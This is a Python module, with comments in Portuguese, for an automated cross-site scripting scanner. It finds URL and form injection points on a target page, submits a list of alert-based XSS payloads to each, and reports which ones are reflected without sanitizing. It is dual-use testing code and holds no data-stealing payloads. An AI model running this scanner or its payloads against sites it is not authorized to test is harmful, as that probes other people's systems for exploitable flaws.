import time
import random
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from config import get_log_filename, log_result
from datetime import datetime, timedelta
from bs4 import BeautifulSoup, NavigableString

class XSSAttack:
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.vulnerabilities = []

    def get_xss_payloads(self):
        """Retorna uma lista mais abrangente e categorizada de payloads XSS."""
        return {
            'script_tags': [
                '<script>alert("XSS-Test-Gemini-CLI-1")</script>',
                '<ScRiPt>alert("XSS-Test-Gemini-CLI-2")</sCrIpT>',
                '--><script>alert("XSS-Test-Gemini-CLI-3")</script>',
            ],
            'event_handlers': [
                '<img src=x onerror=alert("XSS-Test-Gemini-CLI-4")>',
                '<svg onload=alert("XSS-Test-Gemini-CLI-5")>',
                '<body onload=alert("XSS-Test-Gemini-CLI-6")>',
                '<div onmouseover=alert("XSS-Test-Gemini-CLI-7")>Passe o mouse aqui</div>',
                '<input autofocus onfocus=alert("XSS-Test-Gemini-CLI-8")>',
            ],
            'javascript_uri': [
                'javascript:alert("XSS-Test-Gemini-CLI-9")',
                '<iframe src="javascript:alert(\'XSS-Test-Gemini-CLI-10\">")></iframe>',
            ],
            'attribute_breakouts': [
                '" autofocus onfocus=alert("XSS-Test-Gemini-CLI-11")>',
                '\' autofocus onfocus=alert(\'XSS-Test-Gemini-CLI-12\')>',
                '` autofocus onfocus=alert("XSS-Test-Gemini-CLI-13")>`'
            ]
        }

    def get_flattened_payloads(self, custom_payloads=None):
        if custom_payloads:
            return custom_payloads
        
        all_payloads = []
        for category_payloads in self.get_xss_payloads().values():
            all_payloads.extend(category_payloads)
        return all_payloads

    def is_payload_active(self, response_text, payload):
        """Verifica se o payload está ativo e não foi sanitizado na resposta."""
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # 1. Procura por tags de script criadas pelo payload
        # Extrai o conteúdo do alert para busca, ex: XSS-Test-Gemini-CLI-1
        alert_content = ""
        try:
            alert_content = payload.split('(')[1].split(')')[0].replace('"', '').replace("'", "")
        except IndexError:
            return False # Payload malformado para esta verificação

        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and alert_content in script.string:
                return True # Encontrou o script com o conteúdo do alert

        # 2. Procura por atributos de evento (onerror, onload, etc.)
        event_handlers = ['onerror', 'onload', 'onmouseover', 'onfocus']
        for handler in event_handlers:
            tags_with_handler = soup.find_all(attrs={handler: True})
            for tag in tags_with_handler:
                if alert_content in tag[handler]:
                    return True
        
        # 3. Verifica se o payload original está em algum lugar sem ter sido escapado
        # Isso é menos confiável, mas serve como um fallback.
        if payload in response_text and payload.replace('<', '&lt;') not in response_text:
             # Encontrou o payload, e não parece ter sido convertido para entidade HTML
             return True

        return False

    def run(self, target_url, payloads=None, log_file=None, live_log_container=None, progress_container=None):
        """Executa o teste de XSS com detecção avançada de vulnerabilidades."""
        if log_file is None:
            log_file = get_log_filename("xss")
        
        final_payloads = self.get_flattened_payloads(payloads)
        self.vulnerabilities = []
        total_tests = 0

        live_logs = []
        progress_bar, status_text = (None, None)
        if progress_container:
            progress_bar, status_text = progress_container

        def add_log(message, update_progress=None):
            brazil_time = datetime.now() - timedelta(hours=3)
            timestamp = brazil_time.strftime("%H:%M:%S")
            formatted_log = f"[{timestamp}] {message}"
            live_logs.append(formatted_log)
            log_result(message, log_file)
            
            if live_log_container:
                display_logs = live_logs[-15:]
                live_log_container.text_area(
                    f"📋 Logs em Tempo Real ({len(live_logs)} total):", 
                    value="\n".join(display_logs),
                    height=300,
                    key=f"live_logs_xss_{len(live_logs)}"
                )
            
            if progress_bar and update_progress is not None:
                progress_bar.progress(update_progress)
            
            if status_text:
                status_text.text(f"🔄 {message}")

        add_log("🎭 Iniciando teste de XSS com detecção avançada...", 0)
        
        injection_points = set()
        try:
            response = self.session_manager.session.get(target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)
            for param in query_params:
                injection_points.add(('url', param, target_url, 'get'))
                add_log(f"  -> Ponto de injeção (URL): '{param}'")

            all_inputs = soup.find_all(['input', 'textarea', 'select'])
            add_log(f"  -> Encontrados {len(all_inputs)} campos de entrada na página.")
            for field in all_inputs:
                name = field.get('name')
                if not name: continue
                form = field.find_parent('form')
                if form:
                    action = form.get('action', '')
                    form_url = urljoin(target_url, action)
                    method = form.get('method', 'get').lower()
                    injection_points.add(('form', name, form_url, method))
                    add_log(f"  -> Ponto de injeção (Form): '{name}' em {form_url}")
                else:
                    injection_points.add(('orphan', name, target_url, 'get'))
                    injection_points.add(('orphan', name, target_url, 'post'))
                    add_log(f"  -> Ponto de injeção (Órfão): '{name}'")
        except Exception as e:
            add_log(f"🔥 Erro ao analisar a URL alvo: {e}")

        if not injection_points:
            add_log("⚠️ Nenhum ponto de injeção encontrado.", 100)
            return ("Nenhum ponto de injeção encontrado para testar.", 0)

        estimated_tests = len(injection_points) * len(final_payloads)
        add_log(f"📊 Total de testes a serem executados: {estimated_tests}")

        for task_type, name, url, method in injection_points:
            for payload in final_payloads:
                total_tests += 1
                progress = int((total_tests / estimated_tests) * 100) if estimated_tests > 0 else 0
                add_log(f"💉 Teste {total_tests}/{estimated_tests}: Parâmetro '{name}' via {method.upper()}", progress)

                try:
                    if method == 'get':
                        parsed_url = urlparse(url)
                        original_params = parse_qs(parsed_url.query)
                        original_params[name] = payload
                        new_query = urlencode(original_params, doseq=True)
                        test_url = parsed_url._replace(query=new_query).geturl()
                        test_response = self.session_manager.session.get(test_url, timeout=5)
                    else:
                        data = {name: payload}
                        test_response = self.session_manager.session.post(url, data=data, timeout=5)

                    if self.is_payload_active(test_response.text, payload):
                        add_log(f"  🚨 VULNERABILIDADE ENCONTRADA! Payload ATIVO em '{name}'.")
                        self.vulnerabilities.append({"url": url, "param": name, "payload": payload, "method": method})
                    else:
                        add_log(f"  ✅ Seguro: Payload não foi ativado.")

                except Exception as e:
                    add_log(f"  🔥 Erro no teste do parâmetro '{name}': {e}")
                time.sleep(random.uniform(0.1, 0.2))

        add_log("📊 Gerando relatório final...", 100)
        if self.vulnerabilities:
            report = f"🚨 {len(self.vulnerabilities)} vulnerabilidades de XSS Ativo encontradas:\n\n"
            for vuln in self.vulnerabilities:
                report += f"- URL: {vuln['url']}\n"
                report += f"  Método: {vuln['method'].upper()}\n"
                report += f"  Parâmetro Vulnerável: {vuln['param']}\n"
                report += f"  Payload: {vuln['payload']}\n\n"
        else:
            report = "✅ Nenhuma vulnerabilidade de XSS ativa encontrada."
        
        add_log("🏁 Teste de XSS finalizado!", 100)
        return (report, total_tests)